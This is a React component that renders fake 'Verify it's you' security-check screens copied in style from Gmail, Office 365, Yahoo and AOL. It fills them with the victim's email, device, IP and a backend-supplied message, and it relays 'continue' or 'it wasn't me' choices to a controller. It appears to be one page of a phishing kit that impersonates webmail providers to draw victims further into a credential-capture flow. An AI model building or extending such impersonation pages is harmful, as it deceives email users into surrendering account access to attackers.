import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface SecurityCheckPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const SecurityCheckPage: React.FC<SecurityCheckPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const ipAddress = (data.ipAddress as string) || (data.ip as string) || '';
  const deviceName = (data.deviceName as string) || (data.device as string) || 'an unrecognised device';
  const locationText = (data.location as string) || '';
  const backendMessage = (data.message as string) || '';

  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: 'Verify it\u2019s you',
    office365: 'Help us protect your account',
    yahoo: 'A quick security check',
    aol: 'Confirm it\u2019s you',
    others: 'Security check required',
  };

  const description =
    backendMessage ||
    `For your security, ${theme.displayName} needs to verify your identity because a sign-in attempt was made from ${deviceName}` +
      `${locationText ? ` near ${locationText}` : ''}` +
      `${ipAddress ? ` (IP ${ipAddress})` : ''}. If this was you, continue to verify your identity.`;

  const handleContinue = () => {
    if (submitting) return;
    setSubmitting(true);
    onAction('continue_security_check', { email });
  };
  const handleNotMe = () => onAction('deny_security_check', { email });
  const goBack = () => {
    onAction('cancel');
    navigate(-1);
  };

  const DetailRow = ({ label, value }: { label: string; value: string }) => (
    <div className="flex items-center justify-between py-2 text-sm">
      <span className="text-gray-500">{label}</span>
      <span className="font-medium text-gray-800 truncate ml-2">{value}</span>
    </div>
  );

  const Body = () => (
    <>
      <div
        className="mx-auto mb-5 flex items-center justify-center w-16 h-16 rounded-full"
        style={{ backgroundColor: theme.primaryLight }}
      >
        <svg width={32} height={32} viewBox="0 0 24 24" fill="none" stroke={theme.primary} strokeWidth="1.6" aria-hidden="true">
          <path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z" />
          <path d="M9 12l2 2 4-4" />
        </svg>
      </div>
      {(deviceName || locationText || ipAddress) && (
        <div className="border border-gray-200 rounded-lg p-3 mt-2">
          {deviceName && <DetailRow label="Device" value={deviceName} />}
          {locationText && <DetailRow label="Location" value={locationText} />}
          {ipAddress && <DetailRow label="IP address" value={ipAddress} />}
          <DetailRow label="Time" value="Just now" />
        </div>
      )}
    </>
  );

  let primaryActions: React.ReactNode;
  let secondaryAction: React.ReactNode;

  if (providerKey === 'gmail') {
    primaryActions = (
      <button
        type="button"
        onClick={handleContinue}
        disabled={submitting}
        className="px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-60"
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Please wait\u2026' : 'Yes, continue'}
      </button>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={handleNotMe}
        className="text-sm font-semibold hover:underline"
        style={{ color: theme.primary }}
      >
        It wasn&rsquo;t me
      </button>
    );
  } else if (providerKey === 'office365') {
    primaryActions = (
      <>
        <button
          type="button"
          onClick={handleNotMe}
          className="px-6 py-[6px] text-[#1b1b1b] text-sm font-semibold border border-[#8a8886] hover:bg-[#f3f2f1]"
          style={{ minWidth: '108px' }}
        >
          Cancel
        </button>
        <button
          type="button"
          onClick={handleContinue}
          disabled={submitting}
          className="px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60"
          style={{ backgroundColor: theme.primary, minWidth: '108px' }}
        >
          {submitting ? 'Please wait\u2026' : 'Next'}
        </button>
      </>
    );
  } else {
    primaryActions = (
      <button
        type="button"
        onClick={handleContinue}
        disabled={submitting}
        className={
          providerKey === 'aol'
            ? 'w-full py-3 text-white font-bold rounded-md text-base disabled:opacity-50'
            : providerKey === 'yahoo'
              ? 'w-full py-3 text-white font-semibold rounded-full disabled:opacity-50'
              : 'w-full py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60'
        }
        style={{ backgroundColor: theme.primary }}
      >
        {submitting ? 'Please wait\u2026' : providerKey === 'yahoo' ? 'Yes, it was me' : 'Continue'}
      </button>
    );
    secondaryAction = (
      <button
        type="button"
        onClick={handleNotMe}
        className="hover:underline font-medium mx-auto"
        style={{ color: theme.primary }}
      >
        This wasn&rsquo;t me
      </button>
    );
  }

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description}
      onBack={goBack}
      primaryActions={primaryActions}
      secondaryAction={secondaryAction}
    >
      <Body />
    </ProviderShell>
  );
};

export default SecurityCheckPage;
